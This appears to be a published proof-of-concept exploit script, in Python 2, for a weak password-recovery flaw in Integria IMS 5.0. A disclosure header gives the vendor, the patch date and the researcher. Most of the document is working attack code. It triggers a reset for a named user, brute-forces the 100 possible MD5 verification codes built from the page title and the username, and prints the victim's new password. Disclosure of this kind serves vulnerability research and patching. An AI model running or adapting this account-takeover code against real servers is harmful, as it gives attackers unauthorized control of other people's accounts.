'''
* Vendor:  Artica Soluciones Tecnologicas
* Product: Integria IMS Server
* Version: 5.0 MR56 Package 58 and probably earlier
* Category: CWE-640 Weak Password Recovery Mechanism
* Reported: 3/14/17
* Patched: 6/20/17
* Disclosed: 5/14/18
* Researcher: Carl Pearson
* CVE: TBD
* Reference: https://cp270.wordpress.com/2018/05/14/war-story-password-resets/
* Reference: https://github.com/articaST/integriaims/commit/f2ff0ba821644acecb893483c86a9c4d3bb75047

!!!! DO NOT USE without proper authorization !!!!

The Integria IMS password recovery function generates and emails a verification code to users who forget their password. The function has two flaws:
- Innsufficient randomness (for any given user there are only 100 possible codes)
- Lack of brute force protection
This script exploits these complimentary flaws by initiating the password recovery process for a given user, then trying all 100 possible codes until it finds the correct one. 

The verification code is an MD5 hash in the following format:
MD5(sitename + [random number between 0 and 100] + username)

The sitename is the <title> of the external-facing login HTML page and is automatically parsed by this script.
Thus, all that is needed to gain access to a user's account is their username. 
'''

import requests, sys, hashlib
from optparse import OptionParser
debug = False


# parse the Sitename from the login page HTML text
# the Sitename is the <title> of the page
def getSiteName(htmlText):
	startTitle = htmlText.index("<title>")
	endTitle = htmlText.index("</title>")
	sitename = htmlText[startTitle + len("<title>"):endTitle]
	return sitename
	
# parse the new password from the successful verification code page
def getNewPassword(htmlText):
	startFlag = "Your new password is : <b>"
	endFlag = "</b></div>"
	startNewPass = htmlText.index(startFlag)
	endNewPass = htmlText[startNewPass:].index(endFlag)
	newPass = htmlText[startNewPass + len(startFlag):startNewPass + endNewPass]
	#print htmlText
	return newPass
	
def printMain():
	print 'Integria IMS user account takeover script'
	print '!!!! DO NOT USE without proper authorization !!!!'

# Start main code
parser = OptionParser('Usage: takeover.py -s [server name or IP] -u [target username]\nExample: takeover.py -s http://192.168.1.45/integria -u root')
# setup option parsing
parser.add_option("-s", "--server", dest="server", help="URL to target, excluding any specific page. Example: http://example.com/integriaims")
parser.add_option("-u", "--username", dest="username", help="Username to takeover")
parser.add_option("-d", "--debug", dest="debug", action="store_true", help="Turn on debug output")

(options, args) = parser.parse_args()
success = False

debug = options.debug
server = options.server
username = options.username

# if no server or username are supplied then tell the operator and exit
if (server == None ):
	print '[!] You must supply the target IntegriaIMS server hostname or IP address'
	print parser.usage
	exit()
	
if (username == None):
	print '[!] You must supply a username to takeover'
	print parser.usage
	exit()
	
# print the disclaimer and usage information
printMain()

print '[ ] Hijacking account \'' + username + '\' on ' + server
#start by getting the sitename (is the <title> of the default login page)
if (debug):
	print "[d] Retrieving sitename..."
r = requests.get(server)
sitename = getSiteName(r.text)
if (debug):
	print "[d] Found sitename: " + sitename

#trigger the password recovery process on the Integria server
print "[ ] Triggering password recovery procedure..."
r = requests.get(server + "/index.php?recover=" + username)
if ("Don't close this window:" in r.text):
	print "[ ] Password reset process triggered successfully" #Successfully got the server to generate a verificaiton code. Now we can try to brute force it
	
	# loop through each of the 100 possible codes and try it
	print "[ ] Generating and trying 100 codes, please wait..."
	for x in range(0, 100):
		#create the code
		m = hashlib.md5()
		m.update(sitename + str(x) + username)
		testhash = m.hexdigest()
		
		# send the code to the server
		r = requests.post(server + '/index.php?recover=' + username, data={'hash' : testhash})
		if ('Invalid' not in r.text):
			#success, this was the verification code. Print it along with the new password (which is contained in the response HTML page)
			print '[+] Success! Account \'' + username + '\' new password: ' + getNewPassword(r.text)
			if (debug):
				print '[d] Verification code: ' + testhash
			success = True
			break
		# else it wasn't the correct code, loop back around and try the next one
else:
	print '[-] Failed to start password reset process'
	if (debug):
		print '[d] Code=' + str(r.status_code) + ' response text from server=' + r.text
# failure, for whatever reason we didn't reset the password
if (success == False):
	print "[-] Password was not found, please try running the script again (is the target version vulnerable?)"
	
print "[ ] Operations complete"
